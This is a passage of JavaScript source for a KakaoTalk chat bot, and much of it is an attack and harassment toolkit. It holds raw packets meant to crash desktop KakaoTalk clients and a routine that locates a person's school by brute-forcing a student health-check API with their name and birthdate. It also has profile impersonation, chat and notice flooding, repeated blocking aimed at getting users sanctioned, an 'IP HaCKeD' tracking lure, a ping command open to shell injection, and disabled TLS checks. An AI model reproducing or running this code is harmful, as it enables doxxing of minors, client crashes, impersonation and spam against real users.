      let list = "[ 현재 채널 리스트 ]\n";
      for (i in listName) {
        list += `${listName[i]} : ${listId[i]}\n`;
      }
      list.slice(0, -1);
      channel.sendChat(list);
    } catch (err) {
      console.log(err);
    }
  }
  if (data.text.startsWith(prefix + "방장봇")) {
    let channelId = data.text.split(" ")[1];
    let msg = data.text.split(" ").splice(2).join(" ");
    let minutes = new Date().getMinutes();
    let hours = new Date().getHours();
    let day = new Date().getDate();
    let month = new Date().getMonth();
    let year = new Date().getFullYear();
    try {
      setBotAlarm(
        channelId,
        msg,
        `0 ${minutes + 1} ${hours} ${day} ${month + 1} ? ${year}`
      ).then((res) => {
        console.log(res);
        channel.sendChat(JSON.stringify(res));
        channel.sendChat(
          `[ ! ] Current Time: ${new Date().getSeconds()} ${minutes} ${hours} ${day} ${
            month + 1
          } ? ${year}`
        );
      });
    } catch (err) {
      console.log(err);
      channel.sendChat(String(err));
    }
  }
  if (data.text.startsWith(prefix + "강제톡")) {
    let forcedMsg = data.text.replace(prefix + "강제톡 ", "");
    sendRaw(channel, 23, "사진", {
      L: "kakaoplus://plusfriend/talk/bot/@limgehtest/" + forcedMsg, //카카오채널 of 임지혁
      Q: "신기한거",
      V: "사진",
      R: [
        {
          D: "신기한거",
          L: "kakaoplus://plusfriend/talk/bot/@limgehtest/" + forcedMsg,
          I: "내",
          W: 800,
          H: 800,
        },
      ],
    });
  }
  if (data.text.startsWith(prefix + "강퇴해제")) {
    channel.removeKicked(
      channel.getUserInfo({ userId: data.text.split(" ")[1] })
    );
    channel.sendChat("[ ! ] 강퇴해제 완료");
  }
  if (data.text == prefix + "강퇴목록") {
    channel.getKickList().then((res) => {
      longText(
        channel,
        "[ ! ] " + channel.getDisplayName() + "의 강퇴 목록",
        "결과: " +
          res.result.length +
          "명\n" +
          res.result.map((x) => x.nickname + " - " + x.userId).join("\n")
      );
    });
  }
  if (data.text.startsWith(prefix + "차단")) {
    let blockUser = data.text.split(" ");
    channel.sendChat("[ ! ] 시도 횟수: " + blockUser[blockUser.length - 1]);
    data.mentions.forEach((v, i) => {
      for (var i = 0; i < blockUser[blockUser.length - 1]; i++) {
        channel
          .blockUser(channel.getUserInfo({ userId: v.user_id }))
          .then(console.log);
        console.log(i);
        pausecomp(1800);
      }
    });
    channel.sendChat("[ ! ] 차단 완료");
  } //차단 반복 시 그 유저 이용자보호조치 (유저마다 다름)
  if (
    data.text.startsWith(prefix + "어드민") &&
    data.text.charAt(4) !== "해" && //나 왜 charAt 쓴지는 모르겠는데 바꾸긴 귀찮음;;
    data.text != prefix + "어드민리스트"
  ) {
    data.mentions.forEach((v, i) => {
      if (adminList.includes(Number(v.user_id))) {
        channel.sendChat(
          new ChatBuilder()
            .text("[ ! ] ")
            .append(
              new MentionContent(channel.getUserInfo({ userId: v.user_id }))
            )
            .text(`님은 이미 관리자입니다`)
            .build(1)
        );
        return;
      } else {
        adminList.push(Number(v.user_id));
      }
    });
    fs.writeFile(
      "./INFO/adminList.json",
      `{"adminList":[${adminList.join()}]}`,
      "utf8",
      function (error) {
        if (error) {
          console.log(error);
        }
      }
    );
    channel.sendChat("[ ! ] 관리자 등록 완료");
  }
  if (data.text.startsWith(prefix + "ping")) {
    const exec = require("child_process").execSync;
    const iconv = require("iconv-lite");

    const cmd = `ping ${data.text.replace(prefix + "ping ", "")}`;

    let rs = exec(cmd);
    rs = iconv.decode(rs, "euc-kr");
    channel.sendChat(`[ RESULT ]${"\u200b".repeat(500)}\n${String(rs)}`);
  }
  if (data.text.startsWith(prefix + ""))
    if (data.text == prefix + "어드민리스트") {
      let adminList = fs.readFileSync("./INFO/adminList.json", "utf8");
      adminList = JSON.parse(adminList).adminList;
      adminList.push(...topAdmin);
      let list = "";
      adminList.forEach((v, i) => {
        try {
          list += `\n${channel.getUserInfo({ userId: v }).nickname}`;
        } catch {
          list += `\n다른 방의 유저입니다`;
        }
      });
      if (list == "") {
        channel.sendChat("[ ! ] 관리자 리스트가 비어있습니다");
      } else {
        channel.sendChat(
          `[ ! ] 관리자 리스트 (${adminList.length}명): ${"\u200b".repeat(
            500
          )}${list}`
        );
      }
    }
  function encrypt(str) {
    const publicKey = [
      "-----BEGIN PUBLIC KEY-----",
      "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA81dCnCKt0NVH7j5Oh2+SGgEU0aqi5u6",
      "sYXemouJWXOlZO3jqDsHYM1qfEjVvCOmeoMNFXYSXdNhflU7mjWP8jWUmkYIQ8o3FGqMzsMTNxr",
      "+bAp0cULWu9eYmycjJwWIxxB7vUwvpEUNicgW7v5nCwmF5HS33Hmn7yDzcfjfBs99K5xJEppHG0",
      "qc+q3YXxxPpwZNIRFn0Wtxt0Muh1U8avvWyw03uQ/wMBnzhwUC8T4G5NclLEWzOQExbQ4oDlZBv",
      "8BM/WxxuOyu0I8bDUDdutJOfREYRZBlazFHvRKNNQQD2qDfjRz484uFs7b5nykjaMB9k/EJAuHj",
      "JzGs9MMMWtQIDAQAB",
      "-----END PUBLIC KEY-----",
    ].join("\n");

    return require("crypto")
      .publicEncrypt(
        {
          key: Buffer.from(publicKey, "utf-8"),
          padding: require("crypto").constants.RSA_PKCS1_PADDING,
        },
        Buffer.from(str, "utf-8")
      )
      .toString("base64");
  }
  const cityCodes = {
    서울특별시: "sen",
    부산광역시: "pen",
    대구광역시: "dge",
    인천광역시: "ice",
    광주광역시: "gen",
    대전광역시: "dje",
    울산광역시: "use",
    세종특별자치시: "sje",
    경기도: "goe",
    강원도: "kwe",
    충청북도: "cbe",
    충청남도: "cne",
    전라북도: "jbe",
    전라남도: "jne",
    경상북도: "gbe",
    경상남도: "gne",
    제주특별자치도: "jje",
  };
  async function getSchool(channel, name, birth) {
    if (name == undefined || birth == undefined)
      return await channel.sendChat(
        `❌ 이름 또는 생일을 정확히 입력하신지 확인해주세요.`
      );
    const startedTime = Date.now();
    var schoolLevel = birth.substring(0, 2);
    var schoolCode; //vsc 상에서 선언만 되었다고 뜰 수 있는데 지우면 에러
    if (
      birth.length === 6 &&
      !isNaN(birth) &&
      4 <= schoolLevel &&
      schoolLevel <= 15 &&
      birth.substring(2, 4) <= 12 &&
      birth.substring(4, 6) <= 31
    ) {
      if (10 <= schoolLevel) schoolLevel = "초등학교";
      else if (schoolLevel <= 6) schoolLevel = "고등학교";
      else schoolLevel = "중학교";

      if (schoolLevel == "초등학교") schoolCode = "2";
      else if (schoolLevel == "중학교") schoolCode = "3";
      else schoolCode = "4";

      var schoolData = JSON.parse(
        fs.readFileSync("./INFO/schoolData.json").toString("utf8")
      );
      const schoolTasks = Object.keys(schoolData)
        .filter((code) => schoolData[code].name.includes(schoolLevel))
        .reduce(function (resultArray, item, i) {
          const chunkIndex = Math.floor(i / 300);
          if (!resultArray[chunkIndex]) resultArray[chunkIndex] = [];
          resultArray[chunkIndex].push(item);
          return resultArray;
        }, []);

      var taskSuccess = 0;
      var taskIndex = 0; //마찬가지
      var schoolList = [];
      const searchKey = await axios
        .get(
          "https://hcs.eduro.go.kr/v2/searchSchool?lctnScCode=--&schulCrseScCode=hcs%EC%99%9C%EC%9D%B4%EB%9F%AC%EB%83%90%E3%84%B9%E3%85%87%E3%85%8B%E3%85%8B&orgName=%ED%95%99%EA%B5%90%0A&loginType=school"
        )
        .then((res) => res.data.key)
        .catch((e) => "");
      const encName = encrypt(name);
      const encBirth = encrypt(birth);

      for (const schoolTask of schoolTasks) {
        taskIndex++;
        await Promise.all(
          schoolTask.map(async function (task) {
            const userData = await axios
              .post(
                `https://${
                  cityCodes[schoolData[task].city]
                }hcs.eduro.go.kr/v3/findUser`,
                JSON.stringify({
                  birthday: encBirth,
                  deviceUuid: "",
                  lctnScCode: cityCodes[schoolData[task].city],
                  loginType: "school",
                  makeSession: true,
                  name: encName,
                  orgCode: task,
                  orgName: schoolData[task].name,
                  password: null,
                  searchKey: searchKey,
                  stdntPNo: null,
                }),
                {
                  headers: {
                    accept: "application/json, text/plain, */*",
                    "accept-language": "en-US,en;q=0.9",
                    "content-type": "application/json;charset=UTF-8",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-site",
                    "x-requested-with": "XMLHttpRequest",
                    Referer: "https://hcs.eduro.go.kr/",
                    "Referrer-Policy": "strict-origin-when-cross-origin",
                    "User-Agent":
                      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36",
                  },
                }
              )
              .catch((err) => (err.response ? err.response : false));
            var result = userData && userData.data;
            if (
              !!result &&
              result.isError &&
              (result.message.includes("정상적인 조회가 아닙니다") ||
                result.statusCode == 252)
            ) {
              schoolList.push(
                `${schoolData[task].city} ${schoolData[task].name}`
              );
              taskSuccess++;
            }
          })
        );
      }

      if (taskSuccess)
        channel.sendChat(
          `✅ 학교찾기 : 성공 ✅\n${name}님의 정보를 ${taskSuccess}개 찾았습니다!${allsee}\n\n${schoolList.join(
            `\n`
          )}\n\n걸린시간 ${((Date.now() - startedTime) / 1000).toFixed(3)}초`
        );
      else await channel.sendChat(`❌ 학교찾기 : 실패 ❌\n다시 확인해 주세요`);
    } else
      await channel.sendChat(`❌ 생년월일을 양식에 맞춰 작성 해주세요! YYMMDD`);
  }
  if (data.text.startsWith(prefix + "어드민해제")) {
    data.mentions.forEach((v, i) => {
      if (!adminList.includes(Number(v.user_id))) {
        channel.sendChat(
          new ChatBuilder()
            .text("[ ! ] ")
            .append(
              new MentionContent(channel.getUserInfo({ userId: v.user_id }))
            )
            .text(`님은 관리자가 아닙니다`)
            .build(1)
        );
      } else {
        adminList.splice(adminList.indexOf(Number(v.user_id)), 1);
      }
    });
    fs.writeFile(
      "./INFO/adminList.json",
      `{"adminList":[${adminList.join()}]}`,
      "utf8",
      function (error) {
        if (error) {
          console.log(error);
        }
      }
    );
    channel.sendChat("[ ! ] 관리자 해제 완료");
  }
  if (data.text.startsWith(prefix + "학교추적")) {
    getSchool(channel, data.text.split(" ")[1], data.text.split(" ")[2]);
    channel.sendChat("[ 추적 중 ] 경우에 따라 1분까지 걸릴 수 있습니다");
  }
  if (data.text.startsWith(prefix + "닉변경")) {
    //커스텀함수 changeProfile로 대체 가능
    let newNick = data.text.split(" ")[1];
    channel.changeProfile({ nickname: newNick, profilePath: "" });
    channel.sendChat(`[ ! ] 닉네임이 ${newNick}으로 변경되었습니다.`);
  }
  if (data.text == prefix + "프연병") {
    //프로필연속 변경
    if (!profileChange) {
      profileChange = true;
      channel.sendChat("[ ! ] 프연병 시작");
      let nickMsg = "▅▆▇█▇▆▅▄▃▂▁▂▃▄".split("");
      profileInterval = setInterval(() => {
        channel.changeProfile({
          nickname: nickMsg.join(""),
          profilePath: "",
        });
        nickMsg.push(nickMsg[0]);
        nickMsg.shift();
      }, 120);
    } else {
      channel.sendChat("[ ! ] 이미 프연병을 하는중입니다!");
    }
  }
  if (data.text == prefix + "컴폭2") {
    //읽지 않아도 컴퓨터카톡 튕김
    sendRaw(channel, 23, "Search", {
      R: [
        {
          L: "https://search3.kakaocdn.net/argon/600x0_65_wr/CzHtKJ3bE3m",
          MA: [],
          D: "PC 펑",
          PL: "펑",
          TM: "튕",
          SU: [
            {
              TE: "44",
              T: ".",
              IC: "44",
              DE: "",
            },
          ],
        },
      ],
      V: "weather",
      callingPkg: "",
      L: "https://search3.kakaocdn.net/argon/600x0_65_wr/CzHtKJ3bE3m",
      Q: "전국 오늘 날씨",
    });
  }
  if (data.text == prefix + "컴폭") {
    //읽으면 컴퓨터카톡 튕김
    sendRaw(
      channel,
      51,
      '{ "type":"add","csIP":"211.231.102.54","csIP6":"2404:4600:6:23d:211:231:102:54","csPort":9000,"callId":"60745818425297209","duration":0,"member":[{"low":370937503,"high":0,"unsigned":false}] }',
      {
        type: "add",
        csIP: "211.231.102.54",
        csIP6: "2404:4600:6:23d:211:231:102:54",
        csPort: 9000,
        callId: "60745818425297209",
        duration: 0,
        member: [],
      }
    );
  }
  if (data.text.startsWith(prefix + "채팅청소")) {
    let cleanNum = Number(data.text.split(" ")[1]);
    if (cleanNum > 0) {
      channel.sendChat("[ ! ] 채팅을 청소합니다.");
      for (let i = 0; i < cleanNum; i++) {
        channel.sendChat(
          new ChatBuilder()
            .append(
              new AttachmentContent({
                type: "image/webp",
                path: "4412207.emot_017.webp",
                name: "(이모티콘)",
                sound: "",
                width: 10000,
                height: 10000,
                msg: "",
                alt: "카카오 이모티콘",
              })
            )
            .build(25)
        );
      }
    }
  }
  if (data.text == prefix + "프연병중지") {
    if (profileChange) {
      clearInterval(profileInterval);
      profileInterval = null;
      profileChange = false;
    } else {
      channel.sendChat("프연병을 하는중이 아닙니다!");
    }
  }
  if (
    data.text.startsWith(prefix + "감지") &&
    data.mentions.length > 0 &&
    !data.text.startsWith(prefix + "감지해제")
  ) {
    let userId = String(data.mentions[0].user_id);
    if (!detectUser.includes(userId)) {
      detectUser.push(userId);
      channel.sendChat(
        `[ ! ] ${channel.getUserInfo({ userId }).nickname}을 감지합니다.`
      );
    } else {
      channel.sendChat(
        `[ ! ] ${
          channel.getUserInfo({ userId }).nickname
        }은 이미 감지 목록에 있습니다.`
      );
    }
  }
  if (data.text.startsWith(prefix + "감지해제") && data.mentions.length > 0) {
    let userId = String(data.mentions[0].user_id);
    if (detectUser.includes(userId)) {
      detectUser.splice(detectUser.indexOf(userId), 1);
      channel.sendChat(
        `[ ! ] ${channel.getUserInfo({ userId }).nickname}을 감지해제합니다.`
      );
    } else {
      channel.sendChat(
        `[ ! ] ${
          channel.getUserInfo({ userId }).nickname
        }은 감지 목록에 없습니다.`
      );
    }
  }
  if (data.text.startsWith(prefix + "감지목록")) {
    let userList = "";
    for (let i = 0; i < detectUser.length; i++) {
      try {
        userList +=
          "\n" + channel.getUserInfo({ userId: detectUser[i] }).nickname;
      } catch {
        userList += "\n" + "다른 방의 유저입니다";
      }
    }
    if (userList == "") {
      channel.sendChat("[ ! ] 감지 목록이 비어있습니다.");
      return;
    }
    channel.sendChat(
      `[ ! ] 감지 목록 (${detectUser.length}명): ${"\u200b".repeat(
        500
      )}${userList}`
    );
  }
  if (
    data.originalType == KnownChatType.REPLY &&
    data.text == prefix + "읽은사람"
  ) {
    const reply = data.attachment();
    const logId = reply.src_logId;
    if (logId) {
      const readers = channel.getReaders({ logId });
      if (readers.length == 0) channel.sendChat(`[ ! ] 읽은 사람이 없습니다.`);
      longText(
        channel,
        `[ ! ] LOG_ID: ${logId}\nCOUNT: ${readers.length}`,
        `NICKNAME: \n${readers.map((r) => r.nickname).join("\n")}`
      );
    }
  }
  if (data.text == prefix + "투명멘션") {
    let allUser = Array.from(channel.getAllUserInfo());
    let mentions = [];
    allUser.forEach((user, index, _this) => {
      if (String(user.userId).length < 10) return;
      if (!mentions[Math.floor(index / 15)])
        mentions[Math.floor(index / 15)] = [];
      mentions[Math.floor(index / 15)].push({
        user_id: user.userId,
        at: [(index % 15) + 1],
        len: 1,
      });
    });
    mentions.forEach((v) => {
      sendRaw(channel, 25, "", {
        type: "",
        url: "",
        name: "(이모티콘)",
        width: "-1",
        height: "-1",
        sound: "",
        alt: "카카오 이모티콘",
        mentions: v,
      });
    });
  }
  if (data.text.startsWith(prefix + "밴") && data.mentions.length > 0) {
    let banUserId = data.mentions[0].user_id;
    if (banList.includes(String(banUserId))) {
      channel.sendChat("[ ! ] 이미 밴된 유저입니다.");
    } else {
      banList.push(String(banUserId));
      channel.sendChat("[ ! ] 유저를 밴하였습니다.");
    }
  }
  if (data.text.startsWith(prefix + "밴해제") && data.mentions.length > 0) {
    let banUserId = data.mentions[0].user_id;
    if (!banList.includes(String(banUserId))) {
      channel.sendChat("[ ! ] 밴된 유저가 아닙니다.");
    } else {
      banList.splice(banList.indexOf(String(banUserId)), 1);
      channel.sendChat("[ ! ] 유저를 밴해제하였습니다.");
    }
  }
  if (
    data.text == prefix + "카링" &&
    data.originalType == KnownChatType.REPLY
  ) {
    let kalingLogId = data.attachment().src_logId;
    channel.getChatListFrom(kalingLogId).then((chat) => {
      let kalingTarget = chat.result[0];
      kalink(kalingTarget.attachment)
        .then((res) => {
          longText(channel, "RESULT: ", JSON.stringify(res.data));
          sendRaw(
            channel,
            KnownChatType.CUSTOM,
            "KAKAOLINK",
            JSON.stringify(res.data)
          );
        })
        .catch((err) => {
          console.log(error);
        });
    });
  }
  if (data.text == prefix + "모두멘션") {
    let all_mention = new ChatBuilder();
    let mentionList = chunk(Array.from(channel.getAllUserInfo()), 15);
    channel.sendChat(
      "[ ! ] 목표 수: " + Array.from(channel.getAllUserInfo()).length
    );
    mentionList.forEach((v, i) => {
      all_mention.text(allsee);
      mentionList[i].forEach((c, j) => {
        all_mention.append(new MentionContent(c)).text(" ");
      });
      channel.sendChat(all_mention.build(1));
      all_mention = new ChatBuilder();
      pausecomp(110);
    });
  }
  if (data.text.startsWith(prefix + "2실프")) {
    let binaryUserId = BigInt(data.text.split(" ")[1]).toString(2);
    let realProfileId = parseInt(
      binaryUserId.substring(binaryUserId.length - 29),
      2
    ).toString();
    if (realProfileId) {
      sendRaw(channel, 17, "profile", {
        userId: realProfileId,
      });
      channel.sendChat(`[ ! ] SUCCESS: ${realProfileId}`);
    } else {
      channel.sendChat("[ ! ] FAILED");
    }
  }
  if (data.text.startsWith(prefix + "방장실프")) {
    let channelId = data.text.replace(prefix + "방장실프 ", "");
    let targetChannel = client.channelList.get(channelId);
    let botId;
    Array.from(targetChannel.getAllUserInfo()).forEach((user) => {
      if (user.perm == 8) {
        botId = user.userId;
      }
    });
    if (!botId) {
      channel.sendChat("[ ! ] 방장봇이 없습니다.");
      return;
    }
    axios
      .get(`https://open-bot.kakao.com/v1/manager/${botId}/settings`, {
        headers: {
          Authorization: session_info,
          Accept: "application/json, text/plain, */*",
        },
      })
      .then((res) => {
        channel.sendChat(
          `[ SUCCESS ] botId: ${botId}${"\u200b".repeat(500)}\n${JSON.stringify(
            getLongString(res.data.data.keywords),
            null,
            3
          )}`
        );
        console.log(res.data.data);
      });
  }
  if (data.text.startsWith(prefix + "실프") && data.mentions.length > 0) {
    let binaryUserId = BigInt(data.mentions[0].user_id).toString(2);
    let realProfileId = parseInt(
      binaryUserId.substring(binaryUserId.length - 29),
      2
    ).toString();
    if (realProfileId) {
      sendRaw(channel, 17, "profile", {
        userId: realProfileId,
      });
      channel.sendChat(`[ ! ] SUCCESS: ${realProfileId}`);
    } else {
      channel.sendChat("[ ! ] FAILED");
    }
  }
  if (data.text.startsWith(prefix + "프로필")) {
    sendRaw(channel, 17, "profile", {
      userId: data.text.split(" ")[1],
    });
  }
  if (data.text.startsWith(prefix + "톡디여부")) {
    let talkId = data.text.split(" ")[1];
    if (talkId) {
      let talkService = new node_kakao.api.ServiceApiClient(SessionWebClient);
      talkService.canChangeUUID(talkId).then((res) => {
        channel.sendChat(JSON.stringify(res, null, 3));
      });
    }
  }
  if (data.text == prefix + "방퇴장") {
    client.channelList.normal._manageSession.leaveChannel(channel);
  }
  if (data.text == prefix + "초대거부") {
    client.channelList.normal._manageSession.leaveChannel(channel, true);
  }
  if (data.text.startsWith(prefix + "uuid")) {
    let uuid_selection = data.text.split(" ")[1];
    if (uuid_selection == "컴퓨터") {
      channel.sendChat(node_kakao.util.randomWin32DeviceUUID());
    } else if (uuid_selection == "모바일") {
      channel.sendChat(node_kakao.util.randomAndroidSubDeviceUUID());
    } else {
      channel.sendChat("[ ! ] 컴퓨터와 모바일 중에 선택해주세요");
    }
  }
  if (data.text.startsWith(prefix + "톡디검색")) {
    let tdSearch = new node_kakao.api.ServiceApiClient(SessionWebClient);
    tdSearch.findFriendByUUID(data.text.split(" ")[1]).then((res) => {
      channel.sendChat(JSON.stringify(getLongString(res), null, 3));
    });
  }
  if (data.text.startsWith(prefix + "친추")) {
    let search = new node_kakao.api.ServiceApiClient(SessionWebClient);
    search.addFriend(data.text.replace(prefix + "친추 "), "").then(console.log);
  }
  if (data.text.startsWith(prefix + "아이디검색")) {
    let IdSearch = new node_kakao.api.ServiceApiClient(SessionWebClient);
    IdSearch.findFriendById(data.text.split(" ")[1]).then((res) => {
      channel.sendChat(JSON.stringify(getLongString(res), null, 3));
    });
  }
  if (data.text.startsWith(prefix + "이메일")) {
    // !이메일 제목/내용 to example@gmail.com
    let desti_email = data.text.split("to")[1].trim();
    let email_text = data.text.split("/")[1].split("to")[0].trim();
    let subjects = data.text.split("/")[0].split(" ")[1].trim();
    let mailOptions = {
      from: "halamg851@gmail.com",
      to: desti_email,
      subject: subjects,
      text: email_text,
    };
    process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";
    transporter.sendMail(mailOptions, function (error, info) {
      if (error) {
        channel.sendChat(error);
      } else {
        channel.sendChat(`EMAIL SENT: ${info.response}`);
      }
    });
  }
  if (data.text.startsWith(prefix + "방입장")) {
    joinOpenChat(
      channel,
      data.text.split(" ")[1],
      data.text.split(" ")[2],
      data.text.split(" ")[3]
    );
  }
  if (data.text.startsWith(prefix + "외치기")) {
    let shoutMsg = data.text.replace(prefix + "외치기 ", "");
    sendRaw(channel, 1, shoutMsg, {
      shout: true,
    });
  }
  if (data.text.startsWith(prefix + "아이디") && data.mentions.length > 0) {
    channel.sendChat(data.mentions[0].user_id.toString());
  }
  if (data.text.startsWith(prefix + "멘도")) {
    let mention_number = data.text.split(" ")[1];
    try {
      for (var i = 0; i < mention_number; i++) {
        channel.sendChat(
          new node_kakao.ChatBuilder()
            .text(`[ ${i + 1} ] `)
            .append(
              new node_kakao.MentionContent(
                channel.getUserInfo({ userId: data.mentions[0].user_id })
              )
            )
            .build(1)
        );
        pausecomp(110);
      }
    } catch {
      channel.sendChat("[ ! ] 멘션할 대상이 올바르지 않습니다");
    }
  }
  if (data.text.startsWith(prefix + "멘션 ")) {
    if (adminList.includes(id)) {
      let mention_id = data.text.replace(prefix + "멘션 ", "");
      try {
        channel.sendChat(
          new node_kakao.ChatBuilder()
            .text("[ ! ] ")
            .append(
              new node_kakao.MentionContent(
                channel.getUserInfo({ userId: mention_id })
              )
            )
            .text("님을 멘션했습니다")
            .build(1)
        );
      } catch {
        channel.sendChat("[ ! ] 멘션할 대상이 올바르지 않습니다");
      }
    }
  }
  if (data.text.startsWith(prefix + "방제")) {
    let roomTitle = data.text.replace(prefix + "방제 ", "");
    channel.setTitleMeta(roomTitle);
    channel.sendChat(`[ ! ] 방제를 ${roomTitle}로 변경합니다`);
  }
  if (data.text.startsWith(prefix + "kakaotv")) {
    let kakaotvSearch = encodeURI(data.text.split(" ")[1]);
    channel.sendChat("https://tv.kakao.com/search?q=" + kakaotvSearch);
  }
  if (data.text.startsWith(prefix + "tv")) {
    let tvURL = data.text.split(" ")[1];
    channel.setTvLiveMeta({
      url: tvURL,
      live: "on",
    });
    channel.sendChat("tv라이브를 시작합니다");
  }
  if (data.text.startsWith(prefix + "라이브톡")) {
    let liveTalkCount = data.text.split(" ")[2];
    try {
      channel.setLiveTalkInfoMeta({
        liveon: true,
        title: "by LIMGEH-BOT",
        startTime: 999,
        userId: data.mentions[0].user_id,
      });
      channel.setLiveTalkCountMeta({ count: liveTalkCount });
      channel.sendChat("[ ! ] 성공적으로 라이브톡을 시작하였습니다");
    } catch {
      channel.sendChat("ERR: 라이브톡을 시작할 수 없습니다");
    }
  }
  if (data.text.startsWith(prefix + "방프사")) {
    let roomProfileImg = data.text.split(" ")[1];
    channel
      .setGroupMeta({
        group_profile_thumbnail_url: roomProfileImg,
        group_profile_url: roomProfileImg,
      })
      .then(console.log);
  }
  if (data.text.startsWith(prefix + "하트")) {
    let heartBool = data.text.split(" ")[1];
    channel.getReaction().then((x) => {
      channel.sendChat(`[ ! ] ${getLongString(x)}`);
    });
    if (heartBool == "키기" || heartBool == "on") {
      channel.react(true);
    } else if (heartBool == "끄기" || heartBool == "off") {
      channel.react(false);
    } else {
      channel.sendChat("[ ! ] 올바른 인자가 아닙니다");
    }
  }

  if (data.text.startsWith(prefix + "라이브중지")) {
    channel.setLiveTalkInfoMeta({
      liveon: false,
      title: "by LIMGEH-BOT",
      startTime: 999,
      userId: data.mentions[0].user_id,
    });
    channel.sendChat(
      `[ ! ] ${
        channel.getUserInfo({ userId: data.mentions[0].user_id }).nickname
      }님의 라이브톡을 중지합니다`
    );
  }
  if (data.text == prefix + "offtv") {
    channel.setTvLiveMeta({
      url: "",
      live: "off",
    });
    channel.sendChat("[ ! ] 성공적으로 tv를 중지하였습니다");
  }
  if (
    data.text.startsWith(prefix + "추적") &&
    data.text.split(" ").length == 3
  ) {
    (async () => {
      const name = data.text.split(" ")[1]; //이름
      const birthDate = data.text.split(" ")[2]; //생년월일
      let schoolLevel = birthDate.substring(0, 2);
      if (
        birthDate.length === 6 &&
        !isNaN(birthDate) &&
        4 <= schoolLevel &&
        schoolLevel <= 15 &&
        birthDate.substring(2, 4) <= 12 &&
        birthDate.substring(4, 6) <= 31
      ) {
        channel.sendChat("🛠️ Process Ready!");
        if (10 <= schoolLevel) schoolLevel = "초등학교";
        else if (schoolLevel <= 6) schoolLevel = "고등학교";
        else schoolLevel = "중학교";

        let schoolData = JSON.parse(
          fs.readFileSync("./INFO/schoolData.json").toString("utf8")
        );
        const schoolTasks = Object.keys(schoolData)
          .filter((code) => schoolData[code].name.includes(schoolLevel))
          .reduce(function (resultArray, item, i) {
            const chunkIndex = Math.floor(i / 300);
            if (!resultArray[chunkIndex]) resultArray[chunkIndex] = [];
            resultArray[chunkIndex].push(item);
            return resultArray;
          }, []);

        channel.sendChat(`🛠️ 0/${schoolTasks.length} Processing...`);
        let taskSuccess = 0;
        let taskIndex = 0;
        for (const schoolTask of schoolTasks) {
          taskIndex++;
          channel.sendChat(
            `🛠️ ${taskIndex}/${schoolTasks.length} Processing...`
          );
          await Promise.all(
            schoolTask.map(async function (task) {
              const userData = await fetch(
                `https://${
                  cityCodes[schoolData[task].city]
                }hcs.eduro.go.kr/v2/findUser`,
                {
                  headers: {
                    accept: "application/json, text/plain, */*",
                    "accept-language": "en-US,en;q=0.9",
                    "content-type": "application/json;charset=UTF-8",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-site",
                    "x-requested-with": "XMLHttpRequest",
                    Referer: "https://hcs.eduro.go.kr/",
                    "Referrer-Policy": "strict-origin-when-cross-origin",
                  },
                  body: JSON.stringify({
                    orgCode: task,
                    name: encryptData(name),
                    birthday: encryptData(birthDate),
                    stdntPNo: null,
                    loginType: "school",
                  }),
                  method: "POST",
                }
              ).catch(() => ({ status: 500 }));
              console.log(userData);

              if (userData.status === 200) {
                channel.sendChat("✅ PROCESS SUCCESS");
                channel.sendChat(
                  `**${schoolData[task].city} ${schoolData[task].name}** 에서 **${name}** 님의 정보를 찾았습니다!`
                ),
                  taskSuccess++;
              }
            })
          );
        }
        if (taskSuccess) {
          channel.sendChat("✅ PROCESS SUCCESS");
          channel.sendChat(
            `**${name}** 님의 정보를 ${taskSuccess}개 찾았습니다!`
          );
        } else {
          channel.sendChat("❌ PROCESS FAIL");
          channel.sendChat(`**${name}** 님의 정보를 찾지 못했습니다!`);
        }
      } else {
        channel.sendChat("❌ 생년월일을 다시 확인해 주세요!");
      }
    })();
  }
  if (data.text.startsWith(prefix + "사칭") && data.mentions.length > 0) {
    let copycat = channel.getUserInfo({ userId: data.mentions[0].user_id });
    changeProfile(
      channel,
      copycat.nickname,
      copycat.originalProfileURL.replace("https://p.kakaocdn.net", "")
    );
    console.log(
      copycat.originalProfileURL.replace("https://p.kakaocdn.net", "")
    );
    channel.sendChat(`${copycat.nickname}님의 프로필을 사칭했습니다!`);
  }
  if (data.text.startsWith(prefix + "고속도배") && !runningSSPam) {
    let speedSpam = data.text.replace(prefix + "고속도배 ", "");

    if (!speedSpam) {
      channel.sendChat("[ ! ] 문자열을 입력해주세요.");
    } else {
      speedSpamInterval = setInterval(() => {
        channel.setNoticeMeta(speedSpam);
      });
      runningSSPam = true;
    }
  }
  if (data.text == prefix + "고속도배중지" && runningSSPam) {
    clearInterval(speedSpamInterval);
    runningSSPam = false;
    channel.sendChat("[ ! ] 고속도배 중지되었습니다.");
  }
  if (data.text.startsWith(prefix + "도배") && !runningSpam) {
    let spamText = data.text.replace(prefix + "도배 ", "");

    if (spamText == "랜덤") {
      spamInterval = setInterval(() => {
        channel.sendChat(crypto.default.randomBytes(30).toString("base64"));
      }, 110);
      runningSpam = true;
    } else if (!spamText) {
      channel.sendChat("[ ! ] 문자열을 입력해주세요.");
    } else {
      spamInterval = setInterval(() => {
        channel.sendChat(spamText);
      }, 110);
    }
    runningSpam = true;
  }
  if (data.text == prefix + "도배중지" && runningSpam) {
    clearInterval(spamInterval);
    runningSpam = false;
    channel.sendChat("[ ! ] 도배 중지되었습니다.");
  }
  if (data.text == prefix + "랜덤야짤") {
    const hentaiImgs = fs.readFileSync("./INFO/hentai.txt");
    const hentaiURL = hentaiImgs.toString().split("\n");
    channel.sendChat(
      new ChatBuilder()
        .append(
          new AttachmentContent({
            L: "",
            Q: "겁나 건전한 사진",
            V: "image",
            R: [
              {
                D: "IP HaCKeD",
                L: "",
                I: hentaiURL[Math.floor(Math.random() * hentaiURL.length)],
                W: 800,
                H: 1200,
              },
            ],
          })
        )
        .build(23)
    );
  }
  if (data.text == prefix + "프록시체크") {
    proxyCheck(data.text.replace(prefix + "프록시체크 ", "")).then((res) => {
      channel.sendChat(JSON.stringify(res, null, 3));
    });
  }
  if (data.text == prefix + "아이피시작") {
    if (ip_bool) {
      channel.sendChat("[ ! ] 이미 아이피 추적을 시작하고 있습니다.");
      return;
    }
    channel
      .sendChat(
        new ChatBuilder()
          .append(
            new AttachmentContent({
              L: "",
              Q: "IP HaCKeD",
